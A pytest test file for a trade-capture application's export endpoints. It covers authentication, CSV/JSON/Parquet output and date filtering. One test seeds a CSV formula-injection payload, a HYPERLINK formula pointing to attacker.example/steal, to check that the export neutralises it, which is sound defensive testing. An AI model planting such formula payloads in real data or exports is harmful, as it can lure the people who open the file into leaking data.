import io

import pandas as pd
import pytest
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.common.enums import UserRole
from app.modules.trade_capture.models import Book, Counterparty
from tests.conftest import AuthHeadersFactory


async def _seed_confirmed_trade(
    client: AsyncClient, db_session: AsyncSession, trader_headers: dict, risk_headers: dict
) -> tuple[str, str]:
    counterparty = Counterparty(name="Nu Export Trading")
    book = Book(name="Nu Export Book")
    db_session.add_all([counterparty, book])
    await db_session.commit()

    trade_resp = await client.post(
        "/api/v1/trades",
        json={
            "trade_date": "2026-01-10",
            "counterparty_id": str(counterparty.id),
            "book_id": str(book.id),
            "trade_type": "SWAP",
            "buy_sell": "BUY",
            "volume": 10000,
            "fixed_price": 3.00,
            "delivery_start_month": "2026-06-01",
            "delivery_end_month": "2026-06-01",
        },
        headers=trader_headers,
    )
    trade_id = trade_resp.json()["id"]
    await client.post(f"/api/v1/trades/{trade_id}/confirm", headers=risk_headers)
    return trade_id, str(book.id)


@pytest.mark.asyncio
async def test_export_trades_requires_authentication(client: AsyncClient, db_session: AsyncSession):
    resp = await client.get("/api/v1/export/trades")
    assert resp.status_code == 401


@pytest.mark.asyncio
async def test_export_trades_csv_contains_the_booked_trade(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    trader_headers = await auth_headers(UserRole.TRADER, username="export-trader")
    risk_headers = await auth_headers(UserRole.RISK_MANAGER, username="export-risk")
    trade_id, book_id = await _seed_confirmed_trade(
        client, db_session, trader_headers, risk_headers
    )

    resp = await client.get(
        "/api/v1/export/trades", params={"book_id": book_id}, headers=trader_headers
    )
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")

    df = pd.read_csv(io.StringIO(resp.text))
    assert trade_id in df["id"].astype(str).values
    row = df[df["id"] == trade_id].iloc[0]
    assert row["counterparty"] == "Nu Export Trading"
    assert row["status"] == "CONFIRMED"


@pytest.mark.asyncio
async def test_export_trades_csv_neutralizes_formula_injection_in_free_text_fields(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    """Counterparty.name/Book.name are free text with no length or pattern
    constraint (CounterpartyCreate/BookCreate) -- a value starting with =/+/-/@
    would otherwise be interpreted as a formula by Excel/Sheets when an
    ADMIN/RISK_MANAGER later opens an exported CSV, a classic CSV/formula-injection
    chain. See ARCHITECTURE.md's "Internal security-review pass"."""
    trader_headers = await auth_headers(UserRole.TRADER, username="export-formula-trader")
    risk_headers = await auth_headers(UserRole.RISK_MANAGER, username="export-formula-risk")

    payload_name = '=HYPERLINK("http://attacker.example/steal","Click")'
    counterparty = Counterparty(name=payload_name)
    book = Book(name="Formula Injection Book")
    db_session.add_all([counterparty, book])
    await db_session.commit()

    trade_resp = await client.post(
        "/api/v1/trades",
        json={
            "trade_date": "2026-01-10",
            "counterparty_id": str(counterparty.id),
            "book_id": str(book.id),
            "trade_type": "SWAP",
            "buy_sell": "BUY",
            "volume": 1000,
            "fixed_price": 3.00,
            "delivery_start_month": "2026-06-01",
            "delivery_end_month": "2026-06-01",
        },
        headers=trader_headers,
    )
    trade_id = trade_resp.json()["id"]
    await client.post(f"/api/v1/trades/{trade_id}/confirm", headers=risk_headers)

    resp = await client.get(
        "/api/v1/export/trades", params={"book_id": str(book.id)}, headers=trader_headers
    )
    assert resp.status_code == 200

    # The raw wire text has the payload's internal "s CSV-escaped (doubled) because
    # pandas quotes the whole field once it contains a comma -- so the exact
    # leading-' + payload string only reappears after parsing it back out, not in
    # the raw text. What the raw-text check below proves is the one thing that
    # actually matters: the payload's original, un-prefixed form (which Excel would
    # read as a bare formula starting at the cell's first character) never appears
    # verbatim anywhere in the response.
    assert payload_name not in resp.text
    assert "'=HYPERLINK(" in resp.text

    df = pd.read_csv(io.StringIO(resp.text))
    row = df[df["id"] == trade_id].iloc[0]
    assert row["counterparty"] == f"'{payload_name}"


@pytest.mark.asyncio
async def test_export_trades_json_and_parquet_round_trip(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    trader_headers = await auth_headers(UserRole.TRADER, username="export-trader-2")
    risk_headers = await auth_headers(UserRole.RISK_MANAGER, username="export-risk-2")
    trade_id, book_id = await _seed_confirmed_trade(
        client, db_session, trader_headers, risk_headers
    )

    json_resp = await client.get(
        "/api/v1/export/trades",
        params={"book_id": book_id, "format": "json"},
        headers=trader_headers,
    )
    assert json_resp.status_code == 200
    assert any(row["id"] == trade_id for row in json_resp.json())

    parquet_resp = await client.get(
        "/api/v1/export/trades",
        params={"book_id": book_id, "format": "parquet"},
        headers=trader_headers,
    )
    assert parquet_resp.status_code == 200
    assert parquet_resp.headers["content-type"] == "application/octet-stream"
    df = pd.read_parquet(io.BytesIO(parquet_resp.content))
    assert trade_id in df["id"].astype(str).values


@pytest.mark.asyncio
async def test_export_trades_updated_since_filters_out_older_trades(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    trader_headers = await auth_headers(UserRole.TRADER, username="export-trader-3")
    risk_headers = await auth_headers(UserRole.RISK_MANAGER, username="export-risk-3")
    trade_id, book_id = await _seed_confirmed_trade(
        client, db_session, trader_headers, risk_headers
    )

    far_future = "2099-01-01T00:00:00Z"
    resp = await client.get(
        "/api/v1/export/trades",
        params={"book_id": book_id, "format": "json", "updated_since": far_future},
        headers=trader_headers,
    )
    assert resp.status_code == 200
    assert all(row["id"] != trade_id for row in resp.json())


@pytest.mark.asyncio
async def test_export_positions_requires_as_of_date(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    trader_headers = await auth_headers(UserRole.TRADER)
    resp = await client.get("/api/v1/export/positions", headers=trader_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_export_valuation_and_var_results_are_reachable(
    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
):
    trader_headers = await auth_headers(UserRole.TRADER, username="export-trader-4")
    resp = await client.get("/api/v1/export/valuation-results", headers=trader_headers)
    assert resp.status_code == 200

    resp2 = await client.get("/api/v1/export/var-results", headers=trader_headers)
    assert resp2.status_code == 200
